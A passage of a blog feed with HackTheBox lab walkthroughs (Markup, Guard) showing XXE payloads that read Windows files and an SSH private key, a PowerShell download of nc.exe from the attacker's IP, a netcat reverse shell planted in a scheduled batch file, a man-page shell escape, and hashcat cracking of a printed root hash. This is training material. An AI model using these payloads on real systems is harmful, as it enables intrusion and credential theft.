src="https://h4rithd.com/blog/content/images/2021/06/image-236.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1102" height="777" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-236.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-236.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-236.png 1102w" sizes="(min-width: 720px) 720px"></figure><p>At the end, you know how to play <strong>HackTheBox </strong>and what type of vulnerabilities and techniques which can be used to gain access to the machines. Thus we can play rest of the active machines now.&#x1F91D;&#x1F91D;</p><p><strong>Happy Hacking !!!</strong></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-237.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="410" height="501"></figure><p>I&#x2019;ll see you on the next retired machine! &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><p><strong><strong>Find me on </strong></strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Markup Walkthrough]]></title><description><![CDATA[After the Included Walkthrough, Here I'm with Markup, so... let's hack and grab the flags.]]></description><link>https://h4rithd.com/blog/starting-point-htb-markup-walkthrough/</link><guid isPermaLink="false">60b669c3a8ce8209ffb55e72</guid><category><![CDATA[Starting Point Walkthrough]]></category><category><![CDATA[Markup Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Sat, 29 May 2021 17:09:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/MarkupBG.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/MarkupBG.jpg" alt="Markup Walkthrough"><p>After the Included Walkthrough, Here I&apos;m with Markup, so... let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 machines rated as &quot;<strong>Very Easy</strong>&quot; and should be <strong>rooted in a sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="https://h4rithd.com/blog/starting-point-htb-included-walkthrough/index.html">Included</a> machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong><em>Disclaimers: </em></strong><em>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</em></blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="00-start-machine-%E2%80%A6"><strong><strong>00. Start Machine &#x2026;</strong></strong></h2><p>To start the machine, Just click on &quot;<strong>Spawn Machine</strong>&quot;.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-194.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1000" height="460" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-194.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-194.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine.<strong> &#x1F920;</strong></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-195.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="416" height="459"></figure><p>Before going to enumeration steps we can simply ping to the IP address and check whether &#xA0;the VPN is connected and the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests when passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-196.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1492" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-196.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-196.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-196.png 1492w" sizes="(min-width: 720px) 720px"></figure><p>As a ping result, its <code>TTL=127</code>. There is only one route between machine and us (VPN). So definitely it will be a <code>Windows</code> machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6"><strong><strong>01. Enumeration First &#x2026;</strong></strong></h2><h3 id="011-fast-ports-scan"><strong><strong>01.1 Fast ports scan</strong></strong></h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.49</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-197.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1000" height="627" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-197.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-197.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>There&apos;re only webserver and SSH server. &#x1F937;&#x200D;&#x2642;&#xFE0F;&#x1F937;&#x200D;&#x2642;&#xFE0F;</p><h3 id="012-run-nmap-scripting-engine"><strong><strong>01.2 Run Nmap Scripting Engine</strong></strong></h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore, we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 22,80,443 10.10.10.49</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-198.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1000" height="856" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-198.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-198.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>So as usual, I chose webserver as my first enumeration path and I choose port 80 from that too. Let&apos;s open the web browser and navigate to the <code>http://10.10.10.49/</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-199.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1000" height="530" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-199.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-199.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>This time, it is <strong>MegaShopping</strong> login page. Again it&apos;s time to check previous passwords. Do you remember we got some <code>sql</code> credentials from the <a href="https://h4rithd.com/blog/starting-point-htb-included-walkthrough/index.html">include</a> machine? Let&apos;s try those first. &#x1F928;&#x1F928;</p><p><code>Daniel : &gt;SNDv*2wzLWf</code> Believe me we have done it at our first attempt. &#x1F60E;&#x1F60E;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-200.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1000" height="528" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-200.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-200.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Now we have to take a moment to examine the surroundings of this site. While doing so, I found a way forward and this time it is <strong>XML external entity (<a href="https://portswigger.net/web-security/xxe">XXE</a>) injection. </strong>Okay now let&apos;s look at this from the beginning.</p><p>Power up Burp Suite and examine all the requests. While you are doing so, take a look at how the function works for submitting orders.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-201.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1000" height="404" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-201.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-201.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>See! . It&apos;s an XML request. So let&apos;s begin.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-202.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="735" height="500" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-202.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-202.png 735w" sizes="(min-width: 720px) 720px"></figure><blockquote><em>XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application&apos;s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. </em><a href="https://portswigger.net/web-security/xxe"><em>source</em></a></blockquote><p>Now you have an idea about XEE right? I got some sample exploit too from the above source. But since this is an windows machine we have to change some parts of that exploit. Final exploit will be look like this.&#x1F447;&#x1F447;</p><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt;
  &lt;order&gt;
     &lt;quantity&gt;
          1
     &lt;/quantity&gt;
     &lt;item&gt;
          &amp;xxe;
     &lt;/item&gt;
     &lt;address&gt;
          h4rithd.com
     &lt;/address&gt;
  &lt;/order&gt;</code></pre><p>Now issue the request to the Repeater tab by using <code>ctrl + r</code> then navigate to the Repeater tab. Change the XML code as above and click send. You can examine the payload code by changing the <code>&amp;xxe;</code> for other parameters as well (quantity &amp; address) but it will not be successful! &#x1F937;&#x200D;&#x2642;&#xFE0F;&#x1F937;&#x200D;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-203.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1254" height="559" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-203.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-203.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-203.png 1254w" sizes="(min-width: 720px) 720px"></figure><p>As you can see now, the exploit is working. Now what the hack can we do using this? &#x1F60F;&#x1F60F;. We can view any files...&#x1F644;&#x1F644; Again It&apos;s enumerating time. &#x23F3;&#x23F3;</p><p>This machine has port 22 open, Wait.. If it is possible to grab the ssh private key, we can login to the system. &#xA0;Since we have one user name called <code>Daniel</code> let&apos;s use it. In windows file system default SSH keys were stored in <code>C:\Users\&lt;username&gt;\.ssh\</code></p><p>Let&apos;s check if we can grab the <code>id_rsa</code>. The payload will be like below.&#x1F447;&#x1F447;</p><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Users/Daniel/.ssh/id_rsa&quot;&gt; ]&gt;
  &lt;order&gt;
     &lt;quantity&gt;
          1
     &lt;/quantity&gt;
     &lt;item&gt;
          &amp;xxe;
     &lt;/item&gt;
     &lt;address&gt;
          h4rithd.com
     &lt;/address&gt;
  &lt;/order&gt;</code></pre><p>Oh gosh!! We grabbed the private key. &#x1F511;&#x1F511;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-205.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1303" height="611" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-205.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-205.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-205.png 1303w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-204.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1144" height="487" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-204.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-204.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-204.png 1144w" sizes="(min-width: 720px) 720px"></figure><p>Now copy it to our machine and <strong>change the file permissions to read only</strong> by using <code>chmod 600 id_rsa</code> and then try to connect via ssh user as Daniel.</p><pre><code class="language-bash">ssh -i id_rsa Daniel@10.10.10.49</code></pre><p>We were entered to the machine as user Daniel. Let&apos;s grab the user flag now. &#x1F60B;&#x1F60B;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-206.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1402" height="478" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-206.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-206.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-206.png 1402w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="03-privilege-escalation"><strong><strong>03. Privilege Escalation</strong></strong></h2><p>Again we have windows machine to escalate the privileges. You can get cool ideas for Privilege Escalation by referring following links.</p><ol><li><a href="https://www.fuzzysecurity.com/tutorials/16.html">Windows Privilege Escalation Fundamentals</a></li><li><a href="https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842">Privilege Escalation in Windows</a></li></ol><p>While we&apos;re running the <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a> on the background I got another SSH window to enumerate manually, so find what we can do. There, I found a folder called &#xA0;<code>Log-Management</code> in the top of root in drive <code>C:</code> So, time to have a quick look at what is inside that folder.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-207.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1492" height="1290" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-207.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-207.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-207.png 1492w" sizes="(min-width: 720px) 720px"></figure><p>Here the folder has Batch file. Can we view that ??</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-208.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1492" height="846" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-208.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-208.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-208.png 1492w" sizes="(min-width: 720px) 720px"></figure><p>The script will call the <code>wevtutil.exe</code>.</p><blockquote><strong><em>wevtutil </em></strong><em>| Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs. </em><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil"><em>source</em></a></blockquote><p>By analyzing the source code, we understand that this script simply clears the system event logs. &#x1F62F;&#x1F62F;</p><p>Let&apos;s take a look at the permission on this file using <code>icacls</code> command. I think this would be easy if we change the <code>cmd shell</code> as <code>powershell</code>. Just type <strong>powershell </strong>and hit enter.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-209.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1000" height="420" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-209.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-209.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Here it seems like the group <code>BUILTIN\Users</code> has the full control <strong>(F)</strong> over the batch file.</p><blockquote><em><strong>Builtin\users</strong> are all the users that the OS creates when installing the OS including local accounts (e.g. guest, ASP.NET or IUSR_hostname). </em><strong><em>It also includes all the users created in the domain</em></strong><em>. Authenticated users are all users that belong to the domain and have credentials. </em><a href="https://social.technet.microsoft.com/Forums/lync/en-US/a8a00a18-ecd6-4ece-8dee-1248bfe6e9ed/what-is-the-difference-between-builtinusers-and-authenticated-users?forum=sharepointadminlegacy#:~:text=Builtin%5Cusers%20are%20all%20the,the%20domain%20and%20have%20credentials."><em>source</em></a></blockquote><p>Since the above group has the full control over the file and all the users (even Daniel) are included to that group... we can edit that batch file. &#x1F910;&#x1F910;</p><h3 id="031-getting-the-reverse-shell"><strong>03.1 Getting the Reverse Shell</strong></h3><p>So to get the reverse shell using that script file; we need netcat binary and then create the payload file inside the batch file. So let&apos;s power up python web server and then download it into the Markup machine.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-210.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1000" height="406" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-210.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-210.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Navigate to <code>C:\Users\Daniel\</code> and use the following command to download it into the Markup machine by using the power of powershell. Change &lt;YourIP&gt; as yours.&#x263A;&#x263A;</p><pre><code class="language-bash">Powershell -c &quot;IWR -useBasicParsing http://&lt;YourIP&gt;:8888/nc.exe -o nc.exe&quot;</code></pre><p>Then we can create the payload (netcat reverse shell) by using netcat binary to the job.bat file. Change &lt;YourIP&gt; as yours.</p><pre><code class="language-bash">echo C:\Users\Daniel\nc.exe -e cmd.exe &lt;YourIP&gt; 7878&gt; C:\Log-Management\job.bat</code></pre><p>Then again power up the netcat listener and now we need to wait until that script runs as schedules in cron job.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-211.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="1000" height="382" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-211.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-211.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>We got the root flag. &#x1F60E;&#x1F60E;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-212.png" class="kg-image" alt="Markup Walkthrough" loading="lazy" width="805" height="719" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-212.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-212.png 805w" sizes="(min-width: 720px) 720px"></figure><p>Now on the path of Starting point machines, we have only left two machine now.</p><p>I&#x2019;ll see you on the next box! <strong><a href="https://h4rithd.com/blog/starting-point-htb-guard-walkthrough/index.html">Guard</a></strong> &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><p><strong><strong>Find me on </strong></strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Guard Walkthrough]]></title><description><![CDATA[After the Markup Walkthrough, Here I'm with Guard, so... let's hack and grab the flags.]]></description><link>https://h4rithd.com/blog/starting-point-htb-guard-walkthrough/</link><guid isPermaLink="false">60b66770a8ce8209ffb55e42</guid><category><![CDATA[Starting Point Walkthrough]]></category><category><![CDATA[Guard Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Sat, 29 May 2021 16:59:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/GurdBG.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/GurdBG.jpg" alt="Guard Walkthrough"><p>After the Markup Walkthrough, Here I&apos;m with Guard, so... let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 machines rated as &quot;<strong>Very Easy</strong>&quot; and should be <strong>rooted in a sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="https://h4rithd.com/blog/starting-point-htb-markup-walkthrough/index.html">Markup</a> machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><em><em><em><strong>&#x26A0; Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</em></em></em></blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="00-start-machine-%E2%80%A6"><strong><strong>00. Start Machine &#x2026;</strong></strong></h2><p>To start the machine, Just click on &quot;<strong>Spawn Machine</strong>&quot;.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-177.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1000" height="452" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-177.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-177.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine.<strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-178.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="423" height="462"></figure><p>Before going to enumeration steps we can simply ping to the IP address and check whether &#xA0;the VPN is connected and the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests when passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-179.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1484" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-179.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-179.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-179.png 1484w" sizes="(min-width: 720px) 720px"></figure><p>As a ping result, its <code>TTL=63</code>. There is only one route between machine and us (VPN). So definitely, it will be a <code>Linux</code> machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6"><strong><strong>01. Enumeration First &#x2026;</strong></strong></h2><h3 id="011-fast-ports-scan"><strong><strong>01.1 Fast ports scan</strong></strong></h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.50</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-180.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1000" height="630" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-180.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-180.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>What the heck! only SSH?? Did anything go wrong?? &#x1F937;&#x200D;&#x2642;&#xFE0F;&#x1F937;&#x200D;&#x2642;&#xFE0F;</p><h3 id="012-run-nmap-scripting-engine"><strong><strong>01.2 Run Nmap Scripting Engine</strong></strong></h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore, we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 22 10.10.10.50</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-181.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1000" height="491" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-181.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-181.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>It&apos;s only SSH port here. By looking at the SSH version <a href="https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3">information</a> from Nmap results, we can say that OS is <strong>&quot;Ubuntu Bionic&quot;.</strong></p><p>Now our attack vector is pretty small right? So let&apos;s search exploits for &quot;OpenSSH 7.6p1&quot;.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-182.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1000" height="311" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-182.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-182.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Nothing found. The &quot;<strong>OpenSSH &lt; 7.7 - User Enumeration (2)</strong>&quot; is holy crap!! It runs on python2. I got so many dependency error and after fixing all module errors, what I got was nothing.&#x1F62B;&#x1F62B;</p><p>Since the all the machines are in sequence.. What if we try to use the SSH key we found in the previous machine to login as daniel (the previous Markup Machine)</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-183.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1178" height="294" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-183.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-183.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-183.png 1178w" sizes="(min-width: 720px) 720px"></figure><p>I copied the previous SSH key to my current directory and changed the permission as well. So let&apos;s try to login. Remember to use <code>Daniel</code> user as <code>daniel</code> because this is Linux box and all Linux machines has one rule: the username can not use capital letters.</p><pre><code class="language-bash">ssh -i id_rsa daniel@10.10.10.50</code></pre><p>And we successfully logged in to the system.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-184.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1000" height="492" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-184.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-184.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>But we can&apos;t view the user.txt.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-185.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1256" height="370" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-185.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-185.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-185.png 1256w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="02-foothold"><strong><strong>02. Foothold</strong></strong></h2><p>While you do the enumeration on this box you will note that we can not run some commands like python, cat and find likewise. It means some commands are restricted. &#x1F534;&#x1F534;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-186.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="600" height="339" srcset="https://h4rithd.com/blog/content/images/2021/06/image-186.png 600w"></figure><p>After some enumerations and by going through the box I found a pretty cool trick and here it is.&#x1F4A1;</p><p>Do you trust me if I say we can use <strong>man </strong>to read the user flag?? &#x1F914;&#x1F914; Fortunately, the <strong>man </strong>command can be used to spawn a bash shell. Follow me to grab user.txt.</p><p>Open the man page for any tool like <code>man ls</code> . Then press <code>shift + 1</code> &#xA0;, it means &apos;<strong>!</strong>&apos; mark. Then type <code>bash</code> . The full command will be like <strong><code>!bash</code> &#xA0;</strong>then hit enter. &#x1F60E;&#x1F60E; You think nothing happened? But then try to view user flag again using cat. This time you will succeed!!</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-187.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1016" height="332" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-187.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-187.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-187.png 1016w" sizes="(min-width: 720px) 720px"></figure><p>Cool!! It&apos;s time to be the root!!</p><hr><h2 id="03-privilege-escalation"><strong>03. Privilege Escalation</strong></h2><p>To do privilege escalations <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a> will help a lot. But if you are going to use it here, you will have to face a lot of issues. Therefore I will enumerate manually again. And we can find a readable <code>shadow</code> backup in <code>/var/backups</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-188.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1556" height="772" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-188.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-188.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-188.png 1556w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s open that file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-189.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1000" height="199" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-189.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-189.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Here we only need root hash, so copy it to our host machine. Then we can hand over the rest of the work to my pet <a href="https://hashcat.net/hashcat/">Hashcat</a> &#x1F63B;&#x1F63B;</p><pre><code class="language-bash">echo &quot;$6$KIP2PX8O$7VF4mj1i.w/.sIOwyeN6LKnmeaFTgAGZtjBjRbvX4pEHvx1XUzXLTBBu0jRLPeZS.69qNrPgHJ0yvc3N82hY31&quot; &gt;hash

hashcat -m 1800 --force hash /usr/share/wordlists/rockyou.txt
